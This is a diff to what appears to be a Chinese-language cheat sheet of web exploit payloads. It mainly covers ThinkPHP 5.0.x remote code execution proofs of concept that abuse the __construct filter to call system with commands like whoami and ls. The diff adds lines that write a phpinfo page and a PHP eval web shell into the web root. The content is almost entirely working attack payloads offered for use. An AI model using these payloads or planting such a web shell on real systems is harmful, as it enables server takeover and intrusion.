@@ -42,10 +42,21 @@ phpMyadmin漏洞：
 18. `?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}`
 
 **Thinkphp 5.0.23 (完整版) debug模式 POC**
-32. `(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx`
+32. `(post)public/index.php 
+32. (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx`
+
+```
+echo "<?php phpinfo();?>" > /var/www/public/test2.php
+
+echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
+```
+
+
+
 
 **Thinkphp 5.0.23 (完整版) POC**
-33. `（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al`
+33. `（post）public/index.php?s=captcha
+33.  (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al`
 
 **Thinkphp 5.0.10 (完整版) POC**
 34. `(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system`
